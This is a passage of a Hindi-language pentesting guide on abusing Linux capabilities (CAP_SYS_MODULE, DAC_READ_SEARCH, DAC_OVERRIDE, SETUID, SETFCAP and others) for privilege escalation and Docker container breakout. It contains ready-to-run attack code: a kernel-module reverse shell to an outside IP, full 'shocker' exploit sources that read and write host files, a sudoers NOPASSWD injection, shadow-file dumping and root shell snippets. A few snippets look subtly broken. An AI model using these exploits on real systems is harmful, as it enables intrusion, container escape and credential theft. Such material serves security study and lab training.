**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** किसी process को **kernel modules (`init_module(2)`, `finit_module(2)` और `delete_module(2)` system calls) को load और unload** करने की शक्ति देता है, जिससे kernel के core operations तक सीधी पहुंच मिलती है। यह capability गंभीर security risks उत्पन्न करती है, क्योंकि किसी module को load करने से kernel का behavior बदला जा सकता है और isolation boundaries को निष्प्रभावी किया जा सकता है।<sup>[[6]](#references)[[14]](#references)</sup>
एक सामान्य rootful Linux container में, यह **shared host kernel** को target करता है और इसलिए यह सीधा breakout है। यह capability initial user namespace में effective होनी चाहिए, क्योंकि modules को load करना namespaced नहीं है। gVisor, Kata या Hyper-V जैसे userspace-kernel या VM-isolated runtime से यह बदल जाता है कि कौन-सी kernel boundary reachable है। `modules_disabled`, kernel lockdown, signature enforcement, seccomp या किसी LSM द्वारा module loading को अब भी block किया जा सकता है।<sup>[[14]](#references)</sup>

**Binary के साथ उदाहरण**

निम्नलिखित उदाहरण में **`python`** binary के पास यह capability है।
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
डिफ़ॉल्ट रूप से, **`modprobe`** command dependency list और map files को **`/lib/modules/$(uname -r)`** directory में check करता है।\
इसका दुरुपयोग करने के लिए, एक नकली **lib/modules** folder बनाते हैं:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
फिर **kernel module को compile करें, जिसके 2 examples आप नीचे पा सकते हैं और इसे** इस folder में copy करें:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
अंत में, इस kernel module को load करने के लिए आवश्यक python code चलाएँ:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**binary के साथ उदाहरण 2**

निम्नलिखित उदाहरण में **`kmod`** binary में यह capability है।
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
जिसका अर्थ है कि इस privilege का दुरुपयोग करके kernel module insert करने के लिए **`insmod`** command का उपयोग करना संभव है। इस privilege का दुरुपयोग करके **reverse shell** प्राप्त करने के लिए नीचे दिए गए example का पालन करें।

**Example with environment (Docker breakout)**

आप निम्न command का उपयोग करके docker container के अंदर enabled capabilities की जाँच कर सकते हैं:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
पिछले output में आप देख सकते हैं कि **SYS_MODULE** capability enabled है।<sup>[[14]](#references)</sup>

**kernel module** बनाएँ, जो reverse shell execute करेगा, और इसे **compile** करने के लिए **Makefile** बनाएँ:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Makefile में प्रत्येक make word से पहले का खाली वर्ण **टैब होना चाहिए, स्पेस नहीं**!

इसे compile करने के लिए `make` चलाएँ।
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
अंत में, एक shell के अंदर `nc` शुरू करें और दूसरे shell से **load the module** करें; इससे आप `nc` process में shell capture कर लेंगे:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**इस technique का code "Abusing SYS_MODULE Capability" की laboratory से copy किया गया था** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)।<sup>[[1]](#references)</sup>

इस technique का एक अन्य उदाहरण [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) में पाया जा सकता है।

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) किसी process को **files को पढ़ने तथा directories को पढ़ने और execute करने के लिए permissions को bypass** करने में सक्षम बनाता है। यह `open_by_handle_at(2)` को भी authorize करता है, जो उसी mounted filesystem के लिए mount file descriptor के सापेक्ष एक valid file handle की व्याख्या करता है। यह process के mount namespace के बाहर मौजूद हर file को अपने-आप expose नहीं करता। File-handle breakout के लिए host से संबंधित filesystem reference, valid या discoverable handles, compatible filesystem और storage layout, तथा किसी runtime या LSM block का न होना भी आवश्यक है। Historical Docker "Shocker" technique ने प्रभावित layouts में ऐसे combination का प्रदर्शन किया था, जिसका analysis [यहाँ](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) किया गया है।<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
**इसका अर्थ है कि आप file read permission checks और directory read/execute permission checks को bypass कर सकते हैं**।<sup>[[14]](#references)</sup>

**binary के साथ उदाहरण**

binary अपने namespaces में accessible files को पढ़ सकती है। इसलिए, यदि `tar` जैसी file में यह capability हो, तो वह shadow file पढ़ सकती है:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**binary2 के साथ उदाहरण**

इस मामले में मान लेते हैं कि **`python`** binary में यह capability है। root files की सूची बनाने के लिए आप यह कर सकते हैं:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
और किसी file को पढ़ने के लिए आप यह कर सकते हैं:
```python
print(open("/etc/shadow", "r").read())
```
**Environment में Example (Docker breakout)**

आप `capsh --print` का उपयोग करके Docker container के अंदर enabled capabilities की जाँच कर सकते हैं।<sup>[[14]](#references)[[26]](#references)</sup>
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
पिछले output में आप देख सकते हैं कि **DAC_READ_SEARCH** capability enabled है। यह DAC read/search checks को bypass करती है और `open_by_handle_at(2)` की अनुमति देती है; यह अपने-आप में process-debugging capability नहीं है।<sup>[[14]](#references)</sup>

आप जान सकते हैं कि निम्नलिखित exploit [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) पर कैसे काम करता है, लेकिन संक्षेप में, **CAP_DAC_READ_SEARCH** बिना permission checks के file system को traverse करने देती है और `open_by_handle_at(2)` की अनुमति देती है; जब संबंधित namespaces और mounts reachable हों, तो इससे अन्य processes द्वारा खोली गई files expose हो सकती हैं।<sup>[[13]](#references)[[14]](#references)</sup>

इन permissions का दुरुपयोग करके host से files read करने वाला original exploit यहां मिल सकता है: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); निम्नलिखित एक **modified version है, जो read की जाने वाली file को first argument के रूप में pass करने और result को एक file में dump करने देता है**।<sup>[[12]](#references)</sup>
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> Exploit को host पर mounted किसी चीज़ के pointer को ढूँढना आवश्यक है। Original exploit ने file `/.dockerinit` का उपयोग किया था और यह modified version `/etc/hostname` का उपयोग करता है। यदि exploit काम नहीं कर रहा है, तो शायद आपको कोई अलग file सेट करनी होगी। Host पर mounted file ढूँढने के लिए बस `mount` command execute करें:

![CAP SYS MODULE - CAP DAC READ SEARCH: Exploit को host पर mounted किसी चीज़ के pointer को ढूँढना आवश्यक है। Original exploit ने file /.dockerinit का उपयोग किया था और यह modified version...](<../../images/image (407) (1).png>)

**इस technique का code "Abusing DAC_READ_SEARCH Capability" की laboratory से कॉपी किया गया था, जो** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **पर उपलब्ध है।**<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**यह capability file की read और write permission checks तथा अधिकांश execute checks को bypass करती है**; किसी regular file को execute करने के लिए अभी भी कम-से-कम एक execute bit सेट होना आवश्यक है। यह read-only mount, immutable state या LSM denial को override नहीं करती।<sup>[[14]](#references)</sup>

ऐसी files खोजें जो किसी privileged group की membership के कारण readable या writable हो जाती हैं; उपयोगी targets target की ownership और mode bits पर निर्भर करते हैं।<sup>[[14]](#references)</sup>

**binary के साथ Example**

इस example में vim के पास यह capability है, इसलिए आप _passwd_, _sudoers_ या _shadow_ जैसी किसी भी file को modify कर सकते हैं:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Example with binary 2**

इस उदाहरण में **`python`** binary के पास यह capability होगी। आप किसी भी फ़ाइल को override करने के लिए python का उपयोग कर सकते हैं:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Example with environment + CAP_DAC_READ_SEARCH (Docker breakout)**

पिछले `CAP_DAC_READ_SEARCH` environment example में दिखाए अनुसार `capsh --print` के साथ `CAP_DAC_OVERRIDE` को confirm करें।<sup>[[14]](#references)[[26]](#references)</sup>

सबसे पहले पिछला section पढ़ें, जो host की [**arbitrary files पढ़ने के लिए DAC_READ_SEARCH capability का abuse करता है**](linux-capabilities.md#cap_dac_read_search), और exploit को **compile** करें।\
फिर, **shocker exploit के निम्नलिखित version को compile करें**, जो आपको **host के filesystem के अंदर arbitrary files लिखने** की अनुमति देगा:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Docker container से escape करने के लिए आप host से `/etc/shadow` और `/etc/passwd` फ़ाइलों को **download** कर सकते हैं, उनमें एक **new user** **add** कर सकते हैं, और उन्हें overwrite करने के लिए **`shocker_write`** का उपयोग कर सकते हैं। फिर **ssh** के माध्यम से **access** करें।

**इस technique का code "Abusing DAC_OVERRIDE Capability" की laboratory से कॉपी किया गया था:** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

## CAP_CHOWN

**यह capability किसी process को फ़ाइलों का ownership बदलने की अनुमति देती है**।<sup>[[14]](#references)</sup>

**binary के साथ example**

मान लें कि **`python`** binary के पास यह capability है; आप **`shadow`** जैसी फ़ाइल के owner को बदल सकते हैं, फिर अन्य permissions अनुमति देती हों तो प्राप्त access का उपयोग उसे modify करने के लिए कर सकते हैं:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
या **`ruby`** binary में यह capability होने पर:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**यह capability कई file operations के लिए ownership checks को bypass करती है, जिनमें permissions बदलना भी शामिल है**।<sup>[[14]](#references)</sup>

**binary के साथ उदाहरण**

यदि python के पास यह capability है, तो आप shadow file की permissions modify कर सकते हैं, **root password बदल सकते हैं**, और privileges escalate कर सकते हैं:
```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```
### CAP_SETUID

**यह capability किसी process को अपना effective user ID बदलने की अनुमति देती है, जो kernel द्वारा लागू credential और capability rules के अधीन होती है**।<sup>[[14]](#references)</sup>

**binary के साथ उदाहरण**

यदि python के पास यह **capability** है, तो आप इसका बहुत आसानी से abuse करके privileges को root तक escalate कर सकते हैं:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**एक और तरीका:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**यह capability किसी process को अपनी effective group ID बदलने की अनुमति देती है, जो kernel द्वारा लागू किए गए credential और capability rules के अधीन होती है**।<sup>[[14]](#references)</sup>

ऐसी बहुत-सी files हैं जिन्हें आप **privileges escalate करने के लिए overwrite कर सकते हैं,** [**आप यहां से ideas ले सकते हैं**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)।

**Binary के साथ example**

इस मामले में आपको ऐसी interesting files ढूंढनी चाहिए जिन्हें कोई group read कर सकता हो, क्योंकि आप किसी भी group का impersonate कर सकते हैं:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
एक बार जब आपको privileges escalate करने के लिए abuse की जा सकने वाली कोई file (reading या writing के ज़रिए) मिल जाए, तो आप यह करके **interesting group का impersonation करते हुए shell प्राप्त कर सकते हैं**:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
इस मामले में group shadow को impersonate किया गया था, इसलिए आप फ़ाइल `/etc/shadow` पढ़ सकते हैं:
```bash
cat /etc/shadow
```
### संयुक्त chain: CAP_SETGID + CAP_CHOWN

जब दोनों capabilities एक ही helper में उपलब्ध हों, तो एक व्यावहारिक chain इस प्रकार है:

1. EGID को `shadow` (या किसी अन्य privileged group) पर switch करें।
2. Group `shadow` बनाए रखते हुए अपना UID सेट करने के लिए `/etc/shadow` पर `chown` का उपयोग करें।
3. किसी target hash को पढ़ें और crack/pivot करें।
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
यह सीधे full root की आवश्यकता से बचाता है और credential reuse के माध्यम से pivot करने के लिए आमतौर पर पर्याप्त होता है।

यदि **docker** installed है, तो आप **docker group** को **impersonate** कर सकते हैं और इसका दुरुपयोग करके [**docker socket** के साथ communicate करके privileges escalate कर सकते हैं](#writable-docker-socket)।

## CAP_SETFCAP

**यह capability किसी process को file capabilities set करने की अनुमति देती है**।<sup>[[14]](#references)</sup>

**binary के साथ उदाहरण**

यदि python के पास यह **capability** है, तो आप privileges को root तक escalate करने के लिए इसका बहुत आसानी से दुरुपयोग कर सकते हैं:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> नई लिखी गई file capability set पिछले set को replace कर देती है; यदि helper को इसके बाद केवल नई capabilities के साथ execute किया जाता है, तो किसी अन्य file को update करने के लिए उसमें `CAP_SETFCAP` retain नहीं रह सकता।<sup>[[14]](#references)[[25]](#references)</sup>

जब आपके पास [SETUID capability](linux-capabilities.md#cap_setuid) हो, तो privileges escalate करने का तरीका देखने के लिए इसके section पर जा सकते हैं।

**environment के साथ Example (Docker breakout)**

Docker का documented default capability set **CAP_SETFCAP** को शामिल करता है, लेकिन वास्तविक set runtime configuration पर निर्भर करता है।<sup>[[19]](#references)</sup>
आप process capabilities को इस प्रकार inspect कर सकते हैं:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
यह capability file capabilities लिखने की अनुमति देती है, लेकिन यह अपने आप current process को वे capabilities प्रदान नहीं करती और न ही file, bounding-set और namespace rules को bypass करती है, जो file execute होने पर लागू होते हैं।<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
फ़ाइल की permitted capabilities process के capability bounding set द्वारा सीमित होती हैं, और file effective bit यह नियंत्रित करता है कि फ़ाइल का permitted set process के effective set में बढ़ाया जाए या नहीं। यही कारण है कि किसी फ़ाइल में capabilities जोड़ने से execution time पर हर requested capability अपने-आप usable नहीं हो जाती।<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) कई sensitive operations प्रदान करता है, जिनमें `/dev/mem`, `/dev/kmem` या `/proc/kcore` तक access, `mmap_min_addr` को modify करना, `ioperm(2)` और `iopl(2)` system calls तक access, और विभिन्न disk commands शामिल हैं। `FIBMAP ioctl(2)` भी इस capability के माध्यम से enabled होता है, जिसके कारण [past](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) में समस्याएँ उत्पन्न हुई हैं। man page के अनुसार, यह holder को अन्य devices पर device-specific operations की एक range perform करने की अनुमति भी देता है।<sup>[[14]](#references)</sup>

यह **privilege escalation** और **Docker breakout** के लिए उपयोगी हो सकता है।<sup>[[14]](#references)</sup>

यह capability अकेले कोई useful interface expose नहीं करती। Container breakout के लिए accessible host device या resource, device-cgroup और filesystem permission, तथा hardware- और kernel-specific technique की भी आवश्यकता होती है। Strict `/dev/mem`, kernel lockdown, virtualization, seccomp और LSM policy आम तौर पर generic paths को हटा देते हैं। पहले capability और exposure को validate करें:
```bash
capsh --print | grep cap_sys_rawio
ls -l /dev/mem /dev/port 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```
यदि `/dev/mem` स्वीकृत interface है, तो एक disposable lab उस lab के hardware map से चुनी गई range को पढ़कर और उसका hash बनाकर cross-boundary node-memory disclosure प्रदर्शित कर सकती है:
```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```
Universal range का अनुमान न लगाएं: कुछ MMIO regions को पढ़ने से side effects हो सकते हैं, और एक platform पर valid address दूसरे platform पर hardware या kernel memory को control कर सकता है। Kernel-memory modification या device control के लिए approved, platform-specific proof आवश्यक है; कोई सुरक्षित universal raw-write example मौजूद नहीं है।

## CAP_KILL

**यह capability, kernel द्वारा परिभाषित मामलों में processes को signals भेजने के लिए permission checks को bypass करती है।**<sup>[[14]](#references)</sup>

**binary के साथ उदाहरण**

मान लें कि **`python`** binary के पास यह capability है। यदि आप **किसी service या socket configuration** (या किसी service से संबंधित किसी भी configuration file) को भी modify कर सकें, तो आप उसमें backdoor डाल सकते हैं। फिर उस service से संबंधित process को kill करके नई configuration file के आपके backdoor के साथ execute होने की प्रतीक्षा कर सकते हैं।
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc with kill**

यदि आपके पास kill capabilities हैं और कोई **node program root** (या किसी अलग user) के रूप में चल रहा है, तो आप संभवतः उसे **signal SIGUSR1** **send** कर सकते हैं और उसे **node debugger open** करने के लिए मजबूर कर सकते हैं, जिससे आप connect कर सकें।
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**यह capability 1024 से नीचे के Internet ports पर binding की अनुमति देती है।** यह सीधे तौर पर व्यापक privilege escalation प्रदान नहीं करती।<sup>[[14]](#references)</sup>

**binary के साथ उदाहरण**

यदि **`python`** के पास यह capability है, तो वह किसी भी port पर listen कर सकेगा और उसी से किसी अन्य port से connect भी कर सकेगा (कुछ services के लिए specific privilege ports से connections आवश्यक होते हैं)

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

